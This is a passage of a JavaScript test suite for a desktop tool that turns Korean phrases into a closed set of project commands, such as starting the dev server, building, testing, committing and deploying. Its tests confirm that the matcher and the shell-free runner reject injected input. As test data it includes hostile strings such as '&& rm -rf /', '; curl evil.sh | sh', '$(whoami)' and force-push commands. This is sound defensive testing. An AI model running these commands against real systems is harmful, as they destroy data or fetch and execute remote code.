/* WBS-22 · Quick Command rules · WBS-23 execution & result · WBS-24 long-running —
 * `19` §C4, D-106.
 *
 * The corpus below is Canon's, case by case, taken from
 * `JuQode-Private/docs/evidence/planning/q02-q03-quick-command-validation.md`. That document
 * reports 87/87 against a `corpus.json` that lives in a planning scratchpad OUTSIDE both
 * repositories, and it writes down roughly forty of those cases explicitly. Only the ones it
 * writes down are here — a case invented to reach 87 would prove nothing about Canon's corpus.
 * See CANON_FINDINGS CF-12.
 *
 * The negative groups matter most. `19` §C4 is explicit that the product does NOT detect
 * dangerous phrases — it recognises six things and declines everything else — because a product
 * that claims detection teaches the user that whatever it did not flag is safe (q02 §5.7). So
 * the assertions below are not "the danger was caught"; they are "no rule matched, and there is
 * therefore no code path to a shell".
 */
'use strict';
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const R = path.resolve(__dirname, '..');
const { code: srcOf, text: rawOf } = require(path.join(__dirname, 'src.js'));
const { match, normalize, RULES, ruleById, mutatesProjectFiles } = require(path.join(R, 'app/main/qc/rules.js'));
const { availability, packageManager } = require(path.join(R, 'app/main/qc/availability.js'));
/* The store's half of the closed set — `schema.sql` seeds Canon's six, migrations carry the rest. */
const { MIGRATIONS } = require(path.join(R, 'app/main/db/db.js'));

/* One helper for the whole suite — see tests/tmp.js. Eight private copies each cleaned up
 * only in `process.on('exit')`, which a killed run never reaches; the leftovers filled the
 * tmpfs and made the suite flaky in a different place every run. */
const { tempDir } = require(path.join(__dirname, 'tmp.js'));


/** `[phrase, expected]` — expected is a rule id, `unrecognized`, or `['ambiguous', ...readings]`. */
const CORPUS = [
  // ── dev.start (Canon §4 group "dev.start": 띄어쓰기 변형 · 필러 · ㅋㅋ · npm run dev · dev 서버 동의어 · 미리보기 올려줘)
  ['개발 서버 켜줘', 'qc.dev.start'],
  ['개발서버켜줘', 'qc.dev.start'],
  ['개발 서버 좀 켜줘', 'qc.dev.start'],
  ['개발 서버 켜줘!ㅋㅋ', 'qc.dev.start'],
  ['npm run dev', 'qc.dev.start'],
  ['dev 서버', 'qc.dev.start'],
  ['미리보기 올려줘', 'qc.dev.start'],
  ['서버 띄워줘', 'qc.dev.start'],
  ['로컬서버 실행해줘', 'qc.dev.start'],

  // ── dev.stop (Canon: `stop` 동의어 포함)
  ['개발 서버 꺼줘', 'qc.dev.stop'],
  ['서버 멈춰줘', 'qc.dev.stop'],
  ['개발서버 종료해줘', 'qc.dev.stop'],

  // ── build (Canon: `빌드` 단독 · `build 돌려줘` · `npm run build`)
  ['빌드', 'qc.build'],
  ['build 돌려줘', 'qc.build'],
  ['npm run build', 'qc.build'],
  ['빌드 해줘', 'qc.build'],
  ['빌드 한번 돌려봐', 'qc.build'],

  // ── test (Canon: `유닛 테스트 한번 돌려봐` · `test 실행` · `npm test`)
  ['유닛 테스트 한번 돌려봐', 'qc.test'],
  ['test 실행', 'qc.test'],
  ['npm test', 'qc.test'],
  ['테스트 돌려줘', 'qc.test'],
  ['단위테스트 실행해줘', 'qc.test'],

  // ── git.status (Canon: `뭐가 바뀌었어?` · `수정된 파일 확인해줘` — 수정 이 대상어 안에 있어도 잔여물 0)
  ['뭐가 바뀌었어?', 'qc.git.status'],
  ['수정된 파일 확인해줘', 'qc.git.status'],
  ['깃상태', 'qc.git.status'],
  ['git status', 'qc.git.status'],
  ['바뀐 파일 보여줘', 'qc.git.status'],
  ['변경사항', 'qc.git.status'],

  // ── terminal (Canon: `콘솔 열어` · `셸 열어주세요` · `open terminal`)
  ['콘솔 열어', 'qc.terminal.open'],
  ['셸 열어주세요', 'qc.terminal.open'],
  ['open terminal', 'qc.terminal.open'],
  ['터미널 띄워줘', 'qc.terminal.open'],

  // ── ambiguous (Canon §3 — the readings are DETERMINED, and nothing runs)
  ['서버 좀 정리해줘', ['ambiguous', 'qc.dev.stop', 'work']],
  ['서버 치워줘', ['ambiguous', 'qc.dev.stop', 'work']],
  ['개발 서버 정리', ['ambiguous', 'qc.dev.stop', 'work']],
  ['꺼줘', ['ambiguous', 'qc.dev.stop', 'work']],

  // ── negative.change — 변경 동사가 있으면 QC 가 아니다
  ['파일 고쳐줘', 'unrecognized'],
  ['테스트 추가해줘', 'unrecognized'],
  ['빌드 에러 수정해줘', 'unrecognized'],
  ['package.json 에 dev 추가해줘', 'unrecognized'],

  // ── negative.danger — 자유 문장에서 셸로 가는 코드 경로가 없다
  ['rm -rf 해줘', 'unrecognized'],
  ['전부 지워줘', 'unrecognized'],
  ['node_modules 삭제해줘', 'unrecognized'],
  ['git push --force', 'unrecognized'],
  ['git reset --hard 해줘', 'unrecognized'],
  ['서버 켜줘 && rm -rf /', 'unrecognized'],
  ['sudo npm run dev', 'unrecognized'],

  // ── negative.other
  ['서버 켜고 빌드도 해줘', 'unrecognized'],
  ['서버 다시 켜줘', 'unrecognized'],        // 재시작은 MVP 아님
  ['', 'unrecognized'],
  ['웹서버 켜줘', 'unrecognized'],
  ['npm install', 'unrecognized'],

  // ── Canon's out-of-corpus probes (§4, documented explicitly as expected outcomes)
  ['테스트 서버 켜줘', 'unrecognized'],       // 두 규칙 대상어 충돌 → 어느 쪽도 residue 0 아님
  ['개발 서버 켜줘 (5173 포트로)', 'unrecognized'],  // 옵션 미지원
  ['테스트 실행해서 결과 알려줘', 'unrecognized'],    // 복문

  // ── PM 판정 2026-09-12 · 저장 · 배포 (WBS-22b · 22c)
  //
  // Canon's corpus lists BOTH of the first two as 미인식, and it was right to for the rule set it
  // was validated against: with no 저장 and no 배포 rule, the honest answer to either sentence
  // was the Work path. The judgment that reopened F-17 is recorded in
  // `app/main/db/db.js` migration 3 and in `docs/design/PRODUCT_GAPS.md`; `19` §C4's corpus has
  // to be re-validated to match, and until it is these six rows are this repository's own.
  ['커밋해줘', 'qc.git.commit'],
  ['배포해줘', 'qc.deploy'],
  ['저장', 'qc.git.commit'],
  ['배포', 'qc.deploy'],
  ['현재 상태 저장해줘', 'qc.git.commit'],
  // …and the residue-zero rule still governs both: a second clause leaves characters behind.
  ['배포하고 테스트도 해줘', 'unrecognized'],
];

test('Canon\'s documented Quick Command corpus', () => {
  const failures = [];
  for (const [phrase, expected] of CORPUS) {
    const r = match(phrase);
    const got = r.kind === 'qc' ? r.id
      : r.kind === 'ambiguous' ? ['ambiguous', ...r.readings]
      : 'unrecognized';
    if (JSON.stringify(got) !== JSON.stringify(expected)) {
      failures.push(`${JSON.stringify(phrase)} → ${JSON.stringify(got)} (expected ${JSON.stringify(expected)})`);
    }
  }
  assert.deepStrictEqual(failures, [], `${failures.length}/${CORPUS.length} corpus cases disagree with Canon`);
});

test('the corpus actually covers every rule and every branch', () => {
  /* A corpus that happened to exercise one rule would pass the test above and prove nothing.
   * This is the check that the check is real. */
  const outcomes = CORPUS.map(([p]) => match(p));
  for (const rule of RULES) {
    assert.ok(outcomes.some((r) => r.kind === 'qc' && r.id === rule.id), `${rule.id} is never matched`);
  }
  assert.ok(outcomes.some((r) => r.kind === 'ambiguous'), 'no ambiguous case');
  assert.ok(outcomes.some((r) => r.kind === 'unrecognized'), 'no unrecognized case');
  const tiers = new Set(outcomes.map((r) => r.tier));
  for (const t of ['T1', 'T2', 'T2b', 'T2c']) {
    assert.ok([...tiers].some((x) => x.endsWith(t)), `tier ${t} is never reached by the corpus`);
  }
  assert.ok([...tiers].some((x) => x.startsWith('synonym+')), 'the synonym tier is never reached');
  assert.ok(CORPUS.filter(([, e]) => e === 'unrecognized').length >= 15,
    'the negative half of the corpus is what proves there is no path to a shell');
});

/* ── the residue-zero rule, which is the whole safety argument ── */

test('anything the rule table does not account for leaves residue, and matches nothing', () => {
  /* `19` §C4: an allowlist residue check, not a blocklist. So the test is not "these dangerous
   * strings are blocked" — it is "an arbitrary extra fragment defeats the match", which is what
   * makes the property hold for phrases nobody has thought of yet. */
  for (const extra of ['&& rm -rf /', '; curl evil.sh | sh', '--force', '(5173 포트로)', '그리고 배포도',
                       '| tee /tmp/x', '$(whoami)', '`id`', '\n rm -rf ~']) {
    const phrase = `개발 서버 켜줘 ${extra}`;
    const r = match(phrase);
    assert.strictEqual(r.kind, 'unrecognized',
      `"${phrase}" matched ${r.id ?? r.readings} — a phrase with unaccounted characters must match nothing`);
  }
});

test('the same phrase without the extra fragment DOES match', () => {
  /* The counterpart. Without it the test above passes for a matcher that recognises nothing. */
  assert.strictEqual(match('개발 서버 켜줘').id, 'qc.dev.start');
});

test('a change verb is never a Quick Command', () => {
  for (const v of ['고쳐줘', '수정해줘', '추가해줘', '바꿔줘', '지워줘', '삭제해줘', '만들어줘']) {
    for (const obj of ['서버', '빌드', '테스트', '터미널']) {
      const r = match(`${obj} ${v}`);
      assert.strictEqual(r.kind, 'unrecognized', `"${obj} ${v}" reached ${r.id ?? r.readings}`);
    }
  }
});

/* ── normalization (§2), step by step ── */

test('normalization is Canon\'s six steps', () => {
  assert.strictEqual(normalize('개발 서버 켜 줘'), '개발서버켜줘', 'whitespace is removed entirely');
  assert.strictEqual(normalize('켜줘!ㅋㅋ'), '켜줘', 'punctuation, then the emote tail, then punctuation again');
  assert.strictEqual(normalize('켜줘ㅋㅋ...'), '켜줘');
  assert.strictEqual(normalize('Dev Server'), 'devserver', 'latin lowercases');
  assert.strictEqual(normalize('개발 서버 좀 제발 빨리 켜줘'), '개발서버켜줘', 'fillers are removed');
  assert.strictEqual(normalize('  개발   서버  '), '개발서버');
  assert.strictEqual(normalize(null), '');
  assert.strictEqual(normalize(undefined), '');
});

test('normalization is deterministic and idempotent', () => {
  for (const [phrase] of CORPUS) {
    const once = normalize(phrase);
    assert.strictEqual(normalize(once), once, `${JSON.stringify(phrase)} is not idempotent`);
    assert.strictEqual(normalize(phrase), once);
  }
});

test('NFC: the same word typed decomposed and composed is one word', () => {
  /* Korean typed on some IMEs and pasted from some sources arrives decomposed (NFD). Without
   * step 1 those are different strings and one of them matches nothing. */
  const composed = '개발 서버 켜줘';
  const decomposed = composed.normalize('NFD');
  assert.notStrictEqual(composed, decomposed, 'the fixture must actually differ before normalization');
  assert.strictEqual(normalize(decomposed), normalize(composed));
  assert.strictEqual(match(decomposed).id, 'qc.dev.start');
});

/* ── ambiguity (§3) — nothing runs, and both readings are named ── */

test('a bare verb is ALWAYS ambiguous, never a quiet choice', () => {
  for (const v of ['돌려줘', '켜줘', '꺼줘']) {
    const r = match(v);
    assert.strictEqual(r.kind, 'ambiguous', `"${v}" chose ${r.id} without asking`);
    assert.ok(r.readings.length >= 2, `"${v}" offered ${r.readings.length} reading(s)`);
  }
  assert.deepStrictEqual(match('돌려줘').readings, ['qc.dev.start', 'qc.build', 'qc.test']);
  assert.deepStrictEqual(match('켜줘').readings, ['qc.dev.start', 'qc.terminal.open']);
});

test('a one-candidate bare verb still offers `work` as the other reading', () => {
  /* §3 case B: "1개뿐이면 `[id, work]`". A verb with no object does not name its target, so the
   * product asks rather than guessing — even when only one rule could have meant it. */
  assert.deepStrictEqual(match('꺼줘').readings, ['qc.dev.stop', 'work']);
});

test('정리/치워 is two readings, and the other one is a Work', () => {
  /* §3 case C. "서버를 정리한다" is either stopping the running server or tidying the server
   * CODE — and tidying code changes files, which is a Work, not a Quick Command. */
  const r = match('서버 좀 정리해줘');
  assert.strictEqual(r.kind, 'ambiguous');
  assert.deepStrictEqual(r.readings, ['qc.dev.stop', 'work']);
  /* …and with no Quick Command object at all there is nothing to be ambiguous ABOUT. */
  assert.strictEqual(match('정리해줘').kind, 'unrecognized');
});

/* ── the rule set is closed ── */

test('the rule table and the STORE agree — a rule cannot be added in one place alone', () => {
  /* `20`'s `quick_command_rule` is a foreign key, so a rule that exists only in `rules.js` is
   * rejected by the engine on every run. The set is still closed; it is closed at what the
   * schema seeds PLUS what the migrations add, because `schema.sql` is the verbatim copy of
   * Canon's file and is not edited here (see `db.js`'s header). */
  const schema = rawOf('app/main/db/schema.sql');
  /* The statement is one line of `('a'),('b'),…;` — read to the semicolon, not to the first
   * closing paren, or this counts one rule and passes for the wrong reason. */
  const stmt = /insert into quick_command_rule values([^;]*);/.exec(schema);
  assert.ok(stmt, 'the schema no longer seeds quick_command_rule at all');
  const seeded = [...stmt[1].matchAll(/'([^']+)'/g)].map((x) => x[1]);
  assert.strictEqual(seeded.length, 6, 'the schema no longer seeds the six Canon rules');

  const migrated = MIGRATIONS.flatMap((m) => (/insert (?:or ignore )?into quick_command_rule/.test(m.sql)
    ? [...m.sql.matchAll(/'([^']+)'/g)].map((x) => x[1]) : []));
  assert.deepStrictEqual(RULES.map((r) => r.id).sort(), [...seeded, ...migrated].sort(),
    'the rule table and the store disagree — every rule needs a row the foreign key can find');
});

test('exactly two rules write, and both are the ones the PM opened', () => {
  /* `19` §C4 kept write-class rules out of the MVP, and the reason was good: every one of them
   * is a way for a sentence to change something. Two were opened by PM judgment (2026-09-12),
   * and this test is what keeps that a DECISION rather than a drift — a third write rule
   * arriving quietly fails here.
   *
   * `deploy` is its own class, not `write`: it changes nothing on this machine and cannot be
   * taken back, which is a different promise from the one 저장 makes. */
  const byRisk = (k) => RULES.filter((r) => r.risk === k).map((r) => r.id);
  assert.deepStrictEqual(byRisk('write'), ['qc.git.commit']);
  assert.deepStrictEqual(byRisk('deploy'), ['qc.deploy']);
  for (const r of RULES) {
    assert.ok(['read', 'run', 'write', 'deploy'].includes(r.risk), `${r.id} is risk=${r.risk}`);
  }
});

test('저장 never stages what the evidence basis refuses to record', () => {
  /* D-126a's exclusion list exists because a user who never wrote a `.gitignore` would
   * otherwise get plaintext secrets in permanent evidence. A 저장 button that committed the
   * same files would reintroduce the hole through the other door — and a commit is worse than
   * a basis, because it is the user's own history and they may push it. */
  const { pathspec } = require(path.join(R, 'app/main/evidence/exclude.js'));
  const dir = tempDir('juqode-commit-');
  fs.writeFileSync(path.join(dir, 'app.js'), 'x\n');
  const a = availability('qc.git.commit', { root: dir });
  assert.strictEqual(a.available, true);
  const add = a.data.prepare.find((v) => v[1] === 'add');
  assert.ok(add, 'nothing stages the files');
  for (const spec of pathspec()) assert.ok(add.includes(spec), `add -A does not exclude ${spec}`);
});

test('저장 keeps typed text out of the argv — the message is a clock', () => {
  /* `19` §C4's safety argument is that no free-text sentence reaches a spawn. The first rule
   * that WRITES is exactly where that would quietly stop being true. */
  const dir = tempDir('juqode-commit-msg-');
  fs.writeFileSync(path.join(dir, 'a.txt'), 'x\n');
  const a = availability('qc.git.commit', { root: dir });
  assert.match(a.data.message, /^JuQode 저장 · \d{4}-\d{2}-\d{2} \d{2}:\d{2}$/);
  /* The WHOLE vector, not a spot check: every element is named here, so a phrase appended to
   * it anywhere fails this rather than hiding among arguments nobody asserted on. */
  assert.deepStrictEqual(a.data.argv.slice(-3), ['commit', '-m', a.data.message]);
  assert.strictEqual(a.data.argv[0], 'git');
  /* …and `availability()` is never handed the user's words in the first place — the handler
   * passes `{ root, devServer }` and nothing else. Structure, not discipline. */
  assert.ok(!/phrase/.test(srcOf('app/main/qc/availability.js')),
    'availability() can see the phrase the user typed');
});

test('저장: 바뀐 게 없으면 사용 불가이고 실패가 아니다', () => {
  const dir = tempDir('juqode-commit-clean-');
  /* An empty folder with no `.git`: `git init` + `add -A` would save nothing. */
  assert.strictEqual(availability('qc.git.commit', { root: dir }).reason, 'no_changes');
});

test('저장: 제외 대상만 바뀐 저장소는 `저장할 것 없음` 이지 실패가 아니다', () => {
  /* The dirty check and the staging step must ask the SAME question. If the check says "there
   * is something" and the staging excludes all of it, `git commit` fails with an English
   * `nothing to commit` painted red — about a save that was never possible. */
  const { execFileSync } = require('node:child_process');
  const dir = tempDir('juqode-commit-excl-');
  const env = { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_SYSTEM: '/dev/null' };
  fs.writeFileSync(path.join(dir, 'a.txt'), 'x\n');
  execFileSync('git', ['init', '-q'], { cwd: dir, env });
  execFileSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', 'add', '-A'], { cwd: dir, env });
  execFileSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-qm', 'base'], { cwd: dir, env });
  /* The ONLY change is an excluded path. */
  fs.writeFileSync(path.join(dir, '.env'), 'SECRET=1\n');
  assert.strictEqual(availability('qc.git.commit', { root: dir }).reason, 'no_changes');
});

test('제외를 말하는 문구가 코드보다 많이 주장하지 않는다', () => {
  /* MEASURED: 되돌리기와 저장의 문구가 `node_modules` 를 제외 목록으로 적고 있었는데,
   * `exclude.js` 의 목록에는 그런 항목이 없다. 그것이 빠지는 이유는 **`.gitignore`** 이고,
   * `.gitignore` 가 없는 프로젝트 — 이 제품의 사용자가 처음 만드는 폴더가 바로 그것이다 —
   * 에서는 그대로 들어간다. 안전하다고 말해 놓고 안 지키는 것이 이 저장소가 가장 싫어하는
   * 종류의 거짓이므로, 이름을 적으려면 코드가 그 이름을 갖고 있어야 한다. */
  const { GLOBS } = require(path.join(R, 'app/main/evidence/exclude.js'));
  const C = require(path.join(R, 'app/renderer/copy.js'));
  const claims = [...C.C.gap.revertLimits, C.C.gap.qcMeaning['qc.git.commit']].join('\n');

  /* 코드가 갖고 있지 않은 이름을 문구가 무조건적으로 적으면 안 된다. */
  for (const name of ['node_modules', 'dist', 'build']) {
    assert.ok(!GLOBS.some((g) => g.includes(name)),
      `이 검사가 낡았다 — exclude.js 가 이제 ${name} 를 갖고 있다`);
    assert.ok(!claims.includes(name),
      `문구가 ${name} 를 제외한다고 말하지만 exclude.js 는 그 항목을 갖고 있지 않다`);
  }
  /* …그리고 실제로 갖고 있는 것은 말해도 된다. 둘 다 사실이어야 한다. */
  assert.ok(claims.includes('.env'), '문구가 실제 제외 대상(.env)을 말하지 않는다');
  assert.ok(claims.includes('.gitignore'), '문구가 무시 파일이 빠지는 진짜 이유를 말하지 않는다');
});

test('목록이 가르치는 문구는 실제로 그 규칙으로 인식된다', () => {
  /* WBS-22d · 목록에서 고르면 `qcExample` 의 문장이 입력칸에 적힌다. 그 문장이 제 규칙으로
   * 돌아오지 않으면 제품이 사용자에게 **틀린 말을 가르치는** 것이 된다 — 다음번에 그대로 쳤을
   * 때 미인식이 나오거나, 더 나쁘게는 다른 규칙이 걸린다. 규칙의 낱말 목록은 바뀔 수 있으므로
   * 이 검사가 그 둘을 묶어 둔다. */
  const C = require(path.join(R, 'app/renderer/copy.js'));
  const examples = C.C.gap.qcExample;
  assert.deepStrictEqual(Object.keys(examples).sort(), RULES.map((r) => r.id).sort(),
    '규칙과 예시 문구가 일대일이 아니다 — 목록의 어떤 줄은 누를 수 없거나, 없는 규칙을 가르친다');
  for (const [id, phrase] of Object.entries(examples)) {
    const r = match(phrase);
    assert.strictEqual(r.kind, 'qc', `"${phrase}" 는 ${r.kind} 다 (${id})`);
    assert.strictEqual(r.id, id, `"${phrase}" 가 ${r.id} 로 갔다 — 가르치는 말과 도착지가 다르다`);
  }
});

test('no_script 로 끝나는 모든 규칙에는 거기서 나가는 길이 있다', () => {
  /* WBS-23c · `19` §C4 forbids inventing a script, which is right — and leaves the card as a
   * dead end for exactly the projects that need it most. Writing a script IS a file change, so
   * the way out is a Work. This test is what keeps a NEW script-based rule from shipping
   * without one: it derives the list from `availability()` rather than naming it. */
  const C = require(path.join(R, 'app/renderer/copy.js'));
  const bare = project({ 'package.json': JSON.stringify({ name: 'x' }) });
  const dead = RULES.map((r) => r.id)
    .filter((id) => availability(id, { root: bare }).reason === 'no_script');
  assert.ok(dead.length >= 2, `no rule reaches no_script — the check is testing nothing (${dead})`);
  for (const id of dead) {
    assert.ok(C.C.gap.qcSetupIntent[id], `${id} can end at no_script with no way out`);
  }
});

test('배포: package.json 에 deploy 스크립트가 없으면 방법을 지어내지 않는다', () => {
  const withOut = project({ 'package.json': JSON.stringify({ scripts: { build: 'tsc' } }) });
  assert.strictEqual(availability('qc.deploy', { root: withOut }).reason, 'no_script');
  const withIt = project({ 'package.json': JSON.stringify({ scripts: { deploy: 'vercel --prod' } }) });
  const a = availability('qc.deploy', { root: withIt });
  assert.strictEqual(a.available, true);
  assert.deepStrictEqual(a.data.argv, ['npm', 'run', 'deploy']);
  assert.strictEqual(a.data.scriptBody, 'vercel --prod');
});

test('exactly one rule is long-running, and it names its stop rule', () => {
  const long = RULES.filter((r) => r.kind === 'long_running');
  assert.strictEqual(long.length, 1);
  assert.strictEqual(long[0].id, 'qc.dev.start');
  assert.strictEqual(long[0].stopRule, 'qc.dev.stop');
  assert.ok(ruleById(long[0].stopRule), 'the stop rule it names does not exist');
});

/* ── availability (project_condition) ── */

function project(files = {}) {
  const dir = tempDir('juqode-qc-');
  for (const [rel, body] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), body);
  }
  return dir;
}
const pkg = (scripts) => JSON.stringify({ name: 'x', scripts }, null, 2);

test('a project with no package.json says so, and does not invent a command', () => {
  const root = project({});
  for (const id of ['qc.dev.start', 'qc.build', 'qc.test']) {
    const a = availability(id, { root });
    assert.strictEqual(a.available, false);
    assert.strictEqual(a.reason, 'no_package_json');
    assert.ok(!a.data.command, `${id} produced a command anyway: ${a.data.command}`);
  }
});

test('a missing script is `no_script`, never a guessed command', () => {
  const root = project({ 'package.json': pkg({ lint: 'eslint .' }) });
  assert.strictEqual(availability('qc.dev.start', { root }).reason, 'no_script');
  assert.strictEqual(availability('qc.build', { root }).reason, 'no_script');
  assert.strictEqual(availability('qc.test', { root }).reason, 'no_script');
});

test('dev falls back to start, then serve, and says which it chose', () => {
  /* `19` §C4: 어느 것을 골랐는지 설명에 그대로 적는다 — a user whose `start` script does
   * something else entirely has to see that before it runs. */
  const withStart = project({ 'package.json': pkg({ start: 'node server.js' }) });
  const a = availability('qc.dev.start', { root: withStart });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.script, 'start');
  assert.strictEqual(a.data.command, 'npm run start');
  assert.strictEqual(a.data.scriptBody, 'node server.js', 'the actual script body is shown');

  const withServe = project({ 'package.json': pkg({ serve: 'vite preview' }) });
  assert.strictEqual(availability('qc.dev.start', { root: withServe }).data.script, 'serve');

  const withAll = project({ 'package.json': pkg({ dev: 'vite', start: 'node s.js', serve: 'x' }) });
  assert.strictEqual(availability('qc.dev.start', { root: withAll }).data.script, 'dev', 'dev wins');
});

test('npm\'s placeholder test script is 사용 불가, not a run', () => {
  const body = 'echo "Error: no test specified" && exit 1';
  const root = project({ 'package.json': pkg({ test: body }) });
  const a = availability('qc.test', { root });
  assert.strictEqual(a.available, false);
  assert.strictEqual(a.reason, 'placeholder_script');
  assert.strictEqual(a.data.scriptBody, body, 'the user is entitled to see what is in their file');
  assert.ok(!a.data.command, 'the placeholder must not produce a runnable command');
});

test('a real test script runs', () => {
  const root = project({ 'package.json': pkg({ test: 'node --test' }) });
  const a = availability('qc.test', { root });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.command, 'npm run test');
});

test('an already-running dev server is `already_running` with its pid', () => {
  const root = project({ 'package.json': pkg({ dev: 'vite' }) });
  const devServer = { pid: 4242, startedAt: '2026-01-01T00:00:00.000Z', command: 'npm run dev' };
  const a = availability('qc.dev.start', { root, devServer });
  assert.strictEqual(a.reason, 'already_running');
  assert.strictEqual(a.data.pid, 4242);
});

test('stopping a server JuQode did not start is `not_running`', () => {
  /* `19` §C4: JuQode 밖에서 켠 서버는 JuQode 가 끄지 않는다. The handle is the only thing that
   * makes a stop legitimate — signalling a pid nobody recorded is signalling a stranger. */
  const root = project({ 'package.json': pkg({ dev: 'vite' }) });
  assert.strictEqual(availability('qc.dev.stop', { root }).reason, 'not_running');
  const a = availability('qc.dev.stop', { root, devServer: { pid: 4242, startedAt: 't', command: 'npm run dev' } });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.pid, 4242);
});

test('git status needs a git repo, and its command is fixed and read-only', () => {
  const plain = project({ 'package.json': pkg({}) });
  assert.strictEqual(availability('qc.git.status', { root: plain }).reason, 'not_git');

  const repo = project({ 'package.json': pkg({}), '.git/HEAD': 'ref: refs/heads/main\n' });
  const a = availability('qc.git.status', { root: repo });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.command, 'git status --porcelain=v1 --branch',
    'the command is FIXED — nothing the user typed reaches it');
  assert.strictEqual(a.data.readOnly, true);
});

test('the terminal opens with no condition at all', () => {
  /* `19` §C4: 터미널은 package.json 없어도 가능. */
  const a = availability('qc.terminal.open', { root: project({}) });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.reason, null);
  assert.ok(!a.data.command, 'opening the drawer runs no command');
});

test('the package manager comes from the lockfile', () => {
  assert.strictEqual(packageManager(project({ 'pnpm-lock.yaml': '' })), 'pnpm');
  assert.strictEqual(packageManager(project({ 'yarn.lock': '' })), 'yarn');
  assert.strictEqual(packageManager(project({ 'bun.lockb': '' })), 'bun');
  assert.strictEqual(packageManager(project({ 'package-lock.json': '{}' })), 'npm');
  assert.strictEqual(packageManager(project({})), 'npm', 'no lockfile: npm');

  const root = project({ 'package.json': pkg({ build: 'vite build' }), 'pnpm-lock.yaml': '' });
  assert.strictEqual(availability('qc.build', { root }).data.command, 'pnpm run build');
});

test('a malformed package.json is not a package.json we can use', () => {
  const root = project({ 'package.json': '{ not json' });
  assert.strictEqual(availability('qc.build', { root }).reason, 'no_package_json');
});

test('an id outside the closed set is never available', () => {
  const root = project({ 'package.json': pkg({ build: 'x' }) });
  const a = availability('qc.rm.rf', { root });
  assert.strictEqual(a.available, false);
  assert.strictEqual(a.reason, 'unknown_rule');
});

test('every command that exists comes from the project or is fixed', () => {
  /* The property that matters: no command string is ever assembled from user text. Each one is
   * either `<pm> run <script-name-from-a-closed-list>` or a literal. */
  const root = project({ 'package.json': pkg({ dev: 'vite', build: 'vite build', test: 'node --test' }),
                         '.git/HEAD': 'ref: refs/heads/main\n' });
  const allowed = new Set(['npm run dev', 'npm run build', 'npm run test',
                           'git status --porcelain=v1 --branch']);
  for (const rule of RULES) {
    const a = availability(rule.id, { root });
    if (!a.data.command) continue;
    assert.ok(allowed.has(a.data.command), `${rule.id} produced an unexpected command: ${a.data.command}`);
  }
});

/* ───────── execution — `19` §C4's safety contract (Q-03) ───────── */

const run = require(path.join(R, 'app/main/qc/run.js'));
/* Host-neutral stand-ins for `sh -c …`: the program is this Node binary, so the same fixture runs on
 * Windows and POSIX. The product code under test still `spawn`s argv with no shell. */
const NODE = (js, ...args) => [process.execPath, '-e', js, ...args];
const WIN = process.platform === 'win32';

test('there is no shell — a metacharacter is argument text, not syntax', async () => {
  /* The whole safety argument ends here. Recognition already refuses anything with residue, but
   * this is the last line: `spawn(program, args)` execs the program directly, so even if a
   * command string somehow carried `&&` or `$(…)` there is no interpreter to interpret it. */
  const dir = project({});
  const canary = path.join(dir, 'CANARY');
  const r = run.start({ argv: NODE('console.log(process.argv.slice(1).join(" "))', `x && touch ${canary}`, '; rm -rf /', '$(id)', '`id`'), cwd: dir });
  const out = await r.done;

  assert.strictEqual(out.state, 'ok');
  assert.ok(!fs.existsSync(canary), 'a metacharacter in an argument reached a shell');
  assert.ok(out.output.includes('&&'), 'the argument was mangled instead of passed through');
  assert.ok(!out.output.includes('uid='), '$(id) was expanded — something interpreted the argument');
});

test('the exit code is reported as the code, and stderr is not hidden', async () => {
  /* `19` §C4: 종료 코드·stderr 숨기지 않음. `07` §8.1 measured a cancelled child exiting 0, so
   * "it ended" is never read as "it worked". */
  const dir = project({});
  const out = await run.start({ argv: NODE('process.stdout.write("to-stdout\\n"); process.stderr.write("to-stderr\\n"); process.exit(7)'), cwd: dir }).done;

  assert.strictEqual(out.state, 'failed');
  assert.strictEqual(out.code, 7);
  assert.ok(out.output.includes('to-stdout'));
  assert.ok(out.output.includes('to-stderr'), 'stderr was dropped — the user cannot see what failed');
});

test('a command that succeeds is `ok`, and one that is signalled is `stopped`', async () => {
  const dir = project({});
  assert.strictEqual((await run.start({ argv: NODE('process.exit(0)'), cwd: dir }).done).state, 'ok');

  const r = run.start({ argv: NODE('setTimeout(() => {}, 30000)'), cwd: dir, kind: 'long_running' });
  await new Promise((res) => setTimeout(res, 120));
  r.stop();
  const out = await r.done;
  assert.strictEqual(out.state, 'stopped', 'a stopped command was reported as finished');
  /* POSIX proves the stop with the signal that ended it; Windows has none, so it proves it with the
   * taskkill result and the process tree it observed (stopper.js). A request alone proves nothing. */
  assert.strictEqual(out.stop.verdict, WIN ? 'stopped-tree-observed' : 'stopped-by-signal', JSON.stringify(out.stop));
});

test('a program that does not exist fails without throwing', async () => {
  const dir = project({});
  const out = await run.start({ argv: ['juqode-no-such-program-xyz'], cwd: dir }).done;
  assert.strictEqual(out.state, 'failed');
  assert.ok(out.spawnError, 'the spawn failure was swallowed');
  assert.strictEqual(out.code, null, 'a program that never ran has no exit code');
});

test('the command runs in the PROJECT root', async () => {
  /* `19` §C4: cwd = 프로젝트 루트. A command that ran somewhere else would report another
   * folder's state under this project's name. */
  const dir = project({ 'marker.txt': 'here\n' });
  const out = await run.start({ argv: NODE('console.log(process.cwd())'), cwd: dir }).done;
  assert.strictEqual(out.output.trim(), fs.realpathSync(dir));
});

test('the environment is the user\'s own, unchanged', async () => {
  /* `19` §C4: env = 사용자 환경 그대로 · 격리 아님. The product does not pretend to sandbox. */
  const dir = project({});
  const out = await run.start({ argv: NODE('console.log(process.env.JUQODE_QC_PROBE)'), cwd: dir,
                                env: { ...process.env, JUQODE_QC_PROBE: 'passed-through' } }).done;
  assert.strictEqual(out.output.trim(), 'passed-through');
});

test('a process handle is kept, with the time that makes the pid meaningful', async () => {
  /* `07` §8.5: a pid is reusable, so a pid alone cannot identify a process later. */
  const dir = project({});
  const r = run.start({ argv: NODE('setTimeout(() => {}, 5000)'), cwd: dir, kind: 'long_running' });
